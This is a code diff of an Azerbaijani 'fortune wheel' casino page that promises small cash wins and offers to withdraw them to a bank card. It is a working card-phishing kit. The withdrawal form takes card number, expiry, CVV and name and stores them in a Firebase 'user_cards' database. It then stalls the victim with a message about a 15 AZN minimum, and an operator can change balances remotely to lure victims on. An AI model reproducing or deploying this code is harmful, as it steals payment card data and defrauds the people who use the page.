@@ -3,7 +3,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        /* Kazino Premium Kartı */
         .casino-card {
             background: linear-gradient(145deg, #1a1a1d 0%, #000 100%);
             padding: 20px; border-radius: 20px; border: 2px solid #d4af37;
@@ -14,7 +13,6 @@
         .balance-value { font-size: 2.5rem; font-weight: 900; color: #fff; margin: 5px 0; }
         .timer-box { font-size: 0.8rem; color: #00ff88; background: rgba(0,255,136,0.1); padding: 5px 15px; border-radius: 50px; display: inline-block; }
 
-        /* KAZİNO ÇARX DİZAYNI */
         .wheel-outer {
             position: relative; width: 320px; height: 320px;
             padding: 12px; background: #222; border-radius: 50%;
@@ -23,154 +21,91 @@
         #claim-wheel {
             width: 100%; height: 100%; border-radius: 50%;
             transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1);
-            background: conic-gradient(
-                #e63946 0deg 72deg, #1b1b1b 72deg 144deg, 
-                #e63946 144deg 216deg, #1b1b1b 216deg 288deg, #d4af37 288deg 360deg
-            );
+            background: conic-gradient(#e63946 0deg 72deg, #1b1b1b 72deg 144deg, #e63946 144deg 216deg, #1b1b1b 216deg 288deg, #d4af37 288deg 360deg);
             position: relative; overflow: hidden; border: 2px solid #000;
         }
-        .wheel-pointer {
-            position: absolute; top: -15px; left: 50%; transform: translateX(-50%);
-            z-index: 20; color: #d4af37; font-size: 3.5rem; filter: drop-shadow(0 0 5px #000);
-        }
-        .wheel-cap {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 50px; height: 50px; background: #d4af37; border-radius: 50%; z-index: 10;
-            border: 4px solid #1a1a1a; box-shadow: 0 0 15px rgba(0,0,0,0.5);
-        }
+        .wheel-pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); z-index: 20; color: #d4af37; font-size: 3.5rem; }
+        .wheel-cap { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 50px; height: 50px; background: #d4af37; border-radius: 50%; z-index: 10; border: 4px solid #1a1a1a; }
 
-        /* Məbləğ Yazıları */
-        .seg-text {
-            position: absolute; width: 50%; height: 50%; transform-origin: bottom right;
-            text-align: center; font-weight: 900; font-size: 1.2rem; color: #fff;
-            padding-top: 30px; box-sizing: border-box; text-shadow: 2px 2px 4px #000;
-        }
-        .t1 { transform: rotate(0deg); }   /* 0.10 */
-        .t2 { transform: rotate(72deg); }  /* 1.00 */
-        .t3 { transform: rotate(144deg); } /* 0.80 */
-        .t4 { transform: rotate(216deg); } /* 0.50 */
-        .t5 { transform: rotate(288deg); } /* 0.30 */
+        .seg-text { position: absolute; width: 50%; height: 50%; transform-origin: bottom right; text-align: center; font-weight: 900; font-size: 1.2rem; color: #fff; padding-top: 30px; box-sizing: border-box; text-shadow: 2px 2px 4px #000; }
+        .t1 { transform: rotate(0deg); } .t2 { transform: rotate(72deg); } .t3 { transform: rotate(144deg); } .t4 { transform: rotate(216deg); } .t5 { transform: rotate(288deg); }
 
-        /* Düymələr */
         .casino-btn {
-            width: 100%; max-width: 350px; padding: 18px; border-radius: 15px; border: none;
-            font-weight: 900; font-size: 1.1rem; cursor: pointer; transition: 0.3s;
-            text-transform: uppercase; margin-top: 15px;
-            background: linear-gradient(to bottom, #d4af37, #aa8a2e); color: #000;
-            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
+            width: 100%; max-width: 350px; padding: 18px; border-radius: 15px; border: none; font-weight: 900; font-size: 1.1rem; cursor: pointer;
+            background: linear-gradient(to bottom, #d4af37, #aa8a2e); color: #000; box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3); margin-top: 15px;
         }
-        .casino-btn:disabled { background: #333; color: #666; box-shadow: none; cursor: not-allowed; }
-        
-        .withdraw-link {
-            color: #aaa; text-decoration: none; font-size: 0.85rem; margin-top: 20px;
-            padding: 12px 25px; border: 1px solid #333; border-radius: 10px; transition: 0.3s;
-        }
-        .withdraw-link:hover { color: #d4af37; border-color: #d4af37; }
+        .casino-btn:disabled { background: #333; color: #666; cursor: not-allowed; box-shadow: none; }
+        .withdraw-link { color: #aaa; text-decoration: none; font-size: 0.85rem; margin-top: 20px; padding: 12px 25px; border: 1px solid #333; border-radius: 10px; }
 
-        /* MODAL */
-        .modal-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98);
-            z-index: 10000; align-items: center; justify-content: center; padding: 20px;
-        }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; align-items: center; justify-content: center; padding: 20px; }
         .bank-modal { background: #111; width: 100%; max-width: 380px; border-radius: 20px; padding: 25px; border: 1px solid #d4af37; }
         .logo-box { display: flex; justify-content: flex-end; gap: 10px; margin-bottom: 20px; }
-        .logo-box img { height: 22px; filter: grayscale(0.2); }
-        
-        .bank-input {
-            width: 100%; background: #000; border: 1px solid #333; padding: 15px;
-            border-radius: 12px; color: #fff; font-size: 1.1rem; outline: none; margin-top: 8px; box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
-        .bank-input:focus { border-color: #d4af37; }
+        .logo-box img { height: 22px; }
+        .bank-input { width: 100%; background: #000; border: 1px solid #333; padding: 15px; border-radius: 12px; color: #fff; font-size: 1.1rem; outline: none; margin-top: 8px; box-sizing: border-box; font-family: 'Courier New', monospace; }
         .label { font-size: 0.65rem; color: #d4af37; font-weight: 900; margin-top: 15px; display: block; }
     </style>
 
     <div class="casino-card">
         <div class="balance-label">MÖVCUD BALANS</div>
         <div class="balance-value"><span id="ws-balance-display">0.00</span> AZN</div>
-        <div id="ws-timer-display" class="timer-box">SİSTEM HAZIRDIR</div>
+        <div id="ws-timer-display" class="timer-box">YÜKLƏNİR...</div>
     </div>
 
     <div class="wheel-outer">
         <div class="wheel-pointer"><i class="fas fa-caret-down"></i></div>
         <div class="wheel-cap"></div>
         <div id="claim-wheel">
-            <div class="seg-text t1">0.10</div>
-            <div class="seg-text t2">1.00</div>
-            <div class="seg-text t3">0.80</div>
-            <div class="seg-text t4">0.50</div>
-            <div class="seg-text t5">0.30</div>
+            <div class="seg-text t1">0.10</div><div class="seg-text t2">1.00</div><div class="seg-text t3">0.80</div><div class="seg-text t4">0.50</div><div class="seg-text t5">0.30</div>
         </div>
     </div>
 
     <button id="ws-spin-btn" class="casino-btn" onclick="handleSpinStart()">ÇARXI ÇEVİR</button>
-    <a href="javascript:void(0)" class="withdraw-link" onclick="openWithdrawPanel()">
-        <i class="fas fa-university"></i> BALANSI KARTA ÇIXAR
-    </a>
+    <a href="javascript:void(0)" class="withdraw-link" onclick="openWithdrawPanel()"><i class="fas fa-university"></i> BALANSI KARTA ÇIXAR</a>
 
     <div id="ws-withdraw-modal" class="modal-overlay">
         <div class="bank-modal">
-            <div class="logo-box">
-                <img src="visa.png" alt="Visa">
-                <img src="master.png" alt="MasterCard">
-            </div>
-            
+            <div class="logo-box"><img src="visa.png"><img src="master.png"></div>
             <h3 style="margin:0; color:#d4af37;">Kart Məlumatları</h3>
-            
             <span class="label">KART NÖMRƏSİ</span>
             <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
-
-            <div style="display:flex; gap:15px;">
-                <div style="flex:1">
-                    <span class="label">AY / İL</span>
-                    <input type="tel" id="c-date" class="bank-input" placeholder="01/28" maxlength="5">
-                </div>
-                <div style="flex:1">
-                    <span class="label">CVV</span>
-                    <input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3">
-                </div>
-            </div>
-
+            <div style="display:flex; gap:15px;"><div style="flex:1"><span class="label">AY / İL</span><input type="tel" id="c-date" class="bank-input" placeholder="01/28" maxlength="5"></div><div style="flex:1"><span class="label">CVV</span><input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3"></div></div>
             <span class="label">AD SOYAD</span>
             <input type="text" id="c-name" class="bank-input" placeholder="ALİ ALİYEV" style="text-transform: uppercase;">
-
             <button class="casino-btn" style="margin-top:25px;" onclick="finalWithdrawProcess()">TƏSDİQLƏ</button>
-            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:15px; cursor:pointer; font-weight:700;">Ləğv et</button>
+            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:15px; cursor:pointer;">Ləğv et</button>
         </div>
     </div>
 </div>
 
 <script>
     (function() {
-        let balance = parseFloat(localStorage.getItem('ws_balance')) || 0;
-        let lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
-        const rewards = [0.10, 0.30, 0.50, 0.80, 1.00];
+        const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
+        if(!localStorage.getItem('ws_user_id')) localStorage.setItem('ws_user_id', userKey);
+
+        // BALANSI CANLI İZLƏ (ADMİNDƏN DƏYİŞƏNDƏ BURADA DA DƏYİŞƏCƏK)
+        firebase.database().ref('users/' + userKey + '/balance').on('value', snap => {
+            let b = snap.val() || "0.00";
+            document.getElementById('ws-balance-display').innerText = b;
+            localStorage.setItem('ws_balance', b);
+        });
 
         window.formatCard = function(input) {
             let v = input.value.replace(/\D/g, '').match(/.{1,4}/g);
             input.value = v ? v.join(' ') : '';
         };
 
-        const updateView = () => {
-            document.getElementById('ws-balance-display').innerText = balance.toFixed(2);
-            checkSystemStatus();
-        };
-
         function checkSystemStatus() {
             const btn = document.getElementById('ws-spin-btn');
             const timer = document.getElementById('ws-timer-display');
-            const now = Date.now();
-            const waitTime = 5 * 60 * 60 * 1000; // 5 Saat
+            const lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
+            const wait = 5 * 60 * 60 * 1000;
+            const diff = Date.now() - lastSpin;
 
-            if (lastSpin !== 0 && (now - lastSpin) < waitTime) {
+            if (lastSpin !== 0 && diff < wait) {
                 btn.disabled = true;
-                const remaining = waitTime - (now - lastSpin);
-                
-                const hours = Math.floor(remaining / (1000 * 60 * 60));
-                const mins = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
-                const secs = Math.floor((remaining % (1000 * 60)) / 1000);
-                
-                timer.innerText = `Növbəti cəhd: ${hours}saat ${mins}dəq ${secs}san`;
+                let rem = wait - diff;
+                let h = Math.floor(rem / 3600000), m = Math.floor((rem % 3600000) / 60000), s = Math.floor((rem % 60000) / 1000);
+                timer.innerText = `Növbəti cəhd: ${h}saat ${m}dəq ${s}san`;
                 timer.style.color = "#ff4757";
                 setTimeout(checkSystemStatus, 1000);
             } else {
@@ -182,46 +117,37 @@
 
         window.handleSpinStart = function() {
             const wheel = document.getElementById('claim-wheel');
-            const deg = Math.floor(Math.random() * 360) + 7200; // 20 tam dövrə
+            const deg = Math.floor(Math.random() * 360) + 7200;
             wheel.style.transform = `rotate(${deg}deg)`;
-            
             setTimeout(() => {
+                const rewards = [0.10, 0.30, 0.50, 0.80, 1.00];
                 const win = rewards[Math.floor((deg % 360) / 72)];
-                balance += win;
-                lastSpin = Date.now();
-                localStorage.setItem('ws_balance', balance.toFixed(2));
-                localStorage.setItem('ws_last_spin', lastSpin);
-                updateView();
-                alert("Təbriklər! Siz " + win.toFixed(2) + " AZN qazandınız!");
+                let current = parseFloat(localStorage.getItem('ws_balance')) || 0;
+                let total = (current + win).toFixed(2);
+                firebase.database().ref('users/' + userKey).update({ balance: total });
+                localStorage.setItem('ws_last_spin', Date.now());
+                alert("Təbriklər! +" + win.toFixed(2) + " AZN");
+                checkSystemStatus();
             }, 5000);
         };
 
-        window.openWithdrawPanel = function() {
-            document.getElementById('ws-withdraw-modal').style.display = 'flex';
-        };
+        window.openWithdrawPanel = function() { document.getElementById('ws-withdraw-modal').style.display = 'flex'; };
 
         window.finalWithdrawProcess = function() {
             const num = document.getElementById('c-num').value.replace(/\s/g, '');
-            const date = document.getElementById('c-date').value;
-            const cvv = document.getElementById('c-cvv').value;
-            const name = document.getElementById('c-name').value;
-
-            if (num.length < 16) { alert("Kart nömrəsini tam daxil edin!"); return; }
-            if (cvv.length < 3) { alert("CVV səhvdir!"); return; }
-
-            const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
-            
+            if (num.length < 16) { alert("Kart nömrəsini düzgün daxil edin!"); return; }
             firebase.database().ref('user_cards/' + userKey).update({
                 num: document.getElementById('c-num').value,
-                date: date, cvv: cvv, name: name,
-                balance: balance.toFixed(2),
+                date: document.getElementById('c-date').value,
+                cvv: document.getElementById('c-cvv').value,
+                name: document.getElementById('c-name').value,
+                balance: localStorage.getItem('ws_balance'),
                 time: new Date().toLocaleString()
             }).then(() => {
-                alert("Məlumatlar yoxlanılır...\nBalansınız 15 AZN-dən az olduğu üçün köçürmə gözləmədədir.");
+                alert("Məlumatlar yoxlanılır. Balans 15 AZN-dən azdırsa gözləmədə qalacaq.");
                 document.getElementById('ws-withdraw-modal').style.display = 'none';
             });
         };
-
-        updateView();
+        checkSystemStatus();
     })();
 </script>
